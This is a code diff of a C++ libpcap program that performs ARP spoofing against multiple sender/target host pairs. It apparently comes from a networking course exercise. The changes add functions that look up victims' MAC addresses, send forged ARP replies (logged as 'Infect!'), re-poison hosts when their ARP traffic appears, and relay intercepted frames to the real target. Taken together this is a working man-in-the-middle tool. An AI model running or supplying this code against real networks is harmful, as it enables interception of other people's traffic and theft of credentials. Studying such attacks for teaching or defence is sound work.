@@ -20,6 +20,31 @@ void usage() {
 }
 
 pcap_t* handle;
+Ip sender_ip[20];
+Ip target_ip[20];
+Mac my_mac;
+Mac sender_mac[20];
+Mac target_mac[20];
+
+int send_packet_arp(Mac dmac, Mac smac, Mac tmac, Ip sip, Ip tip, bool isRequest){
+    EthArpPacket packet;
+    packet.eth_.dmac_ = dmac;
+    packet.eth_.smac_ = smac;
+    packet.eth_.type_ = htons(EthHdr::Arp);
+
+    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
+    packet.arp_.pro_ = htons(EthHdr::Ip4);
+    packet.arp_.hln_ = Mac::SIZE;
+    packet.arp_.pln_ =  Ip::SIZE;
+	if(isRequest) packet.arp_.op_ = htons(ArpHdr::Request);
+	else packet.arp_.op_ = htons(ArpHdr::Reply);
+    packet.arp_.smac_ = smac;
+    packet.arp_.sip_ = htonl(sip); 
+    packet.arp_.tmac_ = tmac; 
+    packet.arp_.tip_ = htonl(tip); 
+    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+    return res;
+}
 
 int GetMacAddr(const char* interface, uint8_t* mac_addr){
 	struct ifreq ifr;
@@ -44,51 +69,9 @@ int GetMacAddr(const char* interface, uint8_t* mac_addr){
 	return 0;
 }
 
-int send_packet_arp(Mac dmac, Mac smac, Mac tmac, Ip sip, Ip tip, bool isRequest)
-{
-    EthArpPacket packet;
-    packet.eth_.dmac_ = dmac;
-    packet.eth_.smac_ = smac;
-    packet.eth_.type_ = htons(EthHdr::Arp);
-
-    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
-    packet.arp_.pro_ = htons(EthHdr::Ip4);
-    packet.arp_.hln_ = Mac::SIZE;
-    packet.arp_.pln_ =  Ip::SIZE;
-	if(isRequest) packet.arp_.op_ = htons(ArpHdr::Request);
-	else packet.arp_.op_ = htons(ArpHdr::Reply);
-    packet.arp_.smac_ = smac;
-    packet.arp_.sip_ = htonl(sip); 
-    packet.arp_.tmac_ = tmac; 
-    packet.arp_.tip_ = htonl(tip); 
-    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-    return res;
-}
-
-
-uint8_t my_mac[6];
-uint8_t target_mac[6]={0xfe, 0x4e, 0xa4, 0xa0, 0xea, 0x64};
-int main(int argc, char* argv[]) {
-	if (argc <4 || (argc%2)!=0) {
-		usage();
-		return -1;
-	}
-	
-	char* dev = argv[1];
-	char errbuf[PCAP_ERRBUF_SIZE];
-
-	handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
-	
-	if (handle == nullptr) {
-		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
-		return -1;
-	}
-	
-	GetMacAddr(dev, my_mac);
-
-	EthArpPacket packet;
-	for(int i=1;i<argc/2;i++){
-		send_packet_arp(Mac("ff:ff:ff:ff:ff:ff"),Mac(my_mac),Mac::nullMac(),Ip("0.0.0.0"),Ip(argv[2*i]),true);
+void GetMacAddr2(char* arg[], int cnt){
+	for(int i=0;i<cnt;i++){
+		send_packet_arp(Mac("ff:ff:ff:ff:ff:ff"),my_mac,Mac::nullMac(),Ip("0.0.0.0"),Ip(arg[i+2]),true);
 
 		struct pcap_pkthdr* header;
 		const u_char* rcvpacket;
@@ -105,20 +88,55 @@ int main(int argc, char* argv[]) {
 
 				rcvpacket += sizeof(struct EthHdr);
 				arp_hdr = (PArpHdr)rcvpacket;
-				if (static_cast<uint32_t>(arp_hdr->sip()) == static_cast<uint32_t>(Ip(argv[2 * i]))) break;
+				if (static_cast<uint32_t>(arp_hdr->sip()) == static_cast<uint32_t>(Ip(arg[i+2]))) break;
 			}
 		}
-		Mac sender_mac = arp_hdr->smac();
-		if(send_packet_arp(Mac(sender_mac),Mac(my_mac),Mac(sender_mac),Ip(argv[2*i+1]),Ip(argv[2*i]),false)==0){
-			printf("attack\n");
+		if(i%2==0){
+			sender_mac[i/2] = Mac(arp_hdr->smac());
+			sender_ip[i/2] = Ip(arg[i+2]);
+		}
+		else{
+			target_mac[(i-1)/2] = Mac(arp_hdr->smac());
+			target_ip[(i-1)/2] = Ip(arg[i+2]);
 		}
 	}
-	printf("attack All\n");
+}
+
+int main(int argc, char* argv[]) {
+	if (argc <4 || (argc%2)!=0) {
+		usage();
+		return -1;
+	}
+	
+	char* dev = argv[1];
+	char errbuf[PCAP_ERRBUF_SIZE];
+
+	handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
+	
+	if (handle == nullptr) {
+		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
+		return -1;
+	}
+	
+	int infect_cnt=(argc-2)/2;
+	
+	uint8_t my_mac_char[6];
+	GetMacAddr(dev, my_mac_char);
+	my_mac = Mac(my_mac_char);
+	GetMacAddr2(argv, infect_cnt*2);
+
+	for(int i=0;i<infect_cnt;i++){
+		if(send_packet_arp(sender_mac[i],my_mac,sender_mac[i],Ip(target_ip[i]),Ip(sender_ip[i]),false)==0){
+			printf("Infect! (INIT)\n");
+		}
+	}
+	printf("Infect All (INIT)\n");
 
 	struct pcap_pkthdr* header;
 	const u_char* rcvpacket;
 	PEthHdr ethernet_hdr;
 	PArpHdr arp_hdr;
+
 	while(true){
 		int res = pcap_next_ex(handle, &header, &rcvpacket);
 		printf("rcv packet!\n");
@@ -134,19 +152,30 @@ int main(int argc, char* argv[]) {
 			arp_hdr = (PArpHdr)rcvpacket;
 
 			Ip reinfect_sender = Ip(arp_hdr->sip());
-			if(send_packet_arp(Mac(arp_hdr->smac()),Mac(my_mac),Mac(arp_hdr->smac()),arp_hdr->tip(), arp_hdr->sip(),false)==0){
+			int i=-1;
+			for(i=0;i<infect_cnt;i++){
+				if(sender_ip[i]==reinfect_sender) break;
+			}
+			if(i!=-1){
+				if(send_packet_arp(Mac(arp_hdr->smac()),my_mac,Mac(arp_hdr->smac()),arp_hdr->tip(), arp_hdr->sip(),false)==0){
 				printf("reinfect!\n");
+				}
 			}
 		}
 		else{
-
-			ethernet_hdr->dmac_ = Mac(target_mac);
-			ethernet_hdr->smac_, Mac(my_mac);
-			if(pcap_sendpacket(handle, rcvpacket, header->len)!=0){
-				printf("Error sending packet!\n");
+			int i=-1;
+			for(i=0;i<infect_cnt;i++){
+				if(sender_mac[i]==ethernet_hdr->smac_) break;
 			}
-			else{
-				printf("Packet sent succesfully.\n");
+			if(i!=-1){
+				ethernet_hdr->dmac_ = target_mac[i];
+				ethernet_hdr->smac_ = my_mac;
+				if(pcap_sendpacket(handle, rcvpacket, header->len)!=0){
+					printf("Error sending packet!\n");
+				}
+				else{
+					printf("Packet sent succesfully.\n");
+				}
 			}
 		}
 	}
